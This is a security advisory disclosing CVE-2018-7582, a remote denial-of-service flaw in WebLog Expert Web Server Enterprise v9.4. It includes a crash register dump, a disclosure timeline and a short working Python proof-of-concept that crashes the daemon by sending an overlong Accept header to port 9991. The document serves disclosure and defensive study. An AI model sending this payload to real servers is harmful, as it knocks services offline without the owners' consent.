[+] Credits: John Page (aka hyp3rlinx)	
[+] Website: hyp3rlinx.altervista.org
[+] Source:  http://hyp3rlinx.altervista.org/advisories/WEBLOG-EXPERT-WEB-SERVER-ENTERPRISE-v9.4-DENIAL-OF-SERVICE.txt
[+] ISR: Apparition Security          
 

Vendor:
=======
www.weblogexpert.com


Product:
=========
WebLog Expert Web Server Enterprise v9.4

WebLog Expert is a fast and powerful access log analyzer. It will give you information about your site's visitors:
activity statistics, accessed files, paths through the site, information about referring pages, search engines, browsers,
operating systems, and more. The program produces easy-to-read reports that include both text information (tables) and charts.



Vulnerability Type:
===================
Denial Of Service


CVE Reference:
==============
CVE-2018-7582



Security Issue:
================
WebLog Expert Web Server Enterprise 9.4 allows Remote Denial Of Service (daemon crash) via a long HTTP Accept Header to TCP port 9991.


(e7c.1750): CLR exception - code e0434352 (first/second chance not available)
eax=00000000 ebx=06d1d098 ecx=00000005 edx=00000000 esi=00000002 edi=00000000
eip=778d016d esp=06d1d048 ebp=06d1d0e4 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!NtWaitForMultipleObjects+0x15:
778d016d 83c404          add     esp,4



Exploit/POC:
=============
import socket

print 'Weblog Expert Server / Denial Of Service'
print 'hyp3rlinx'

IP='Weblog Expert Server IP'
PORT=9991
PAYLOAD="GET /index.html HTTP/1.0 Host: +'IP'+':9991 User-Agent: Mozilla Accept: */*" + "A"*2000+'\r\n\r\n'

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP,PORT))
s.send(PAYLOAD)
s.close()




Network Access:
===============
Remote



Severity:
=========
Medium



Disclosure Timeline:
=============================
Vendor Notification: February 3, 2018
Second attempt : February 17, 2018
March 7, 2018 : Public Disclosure



[+] Disclaimer
The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
or exploits by the author or elsewhere. All content (c).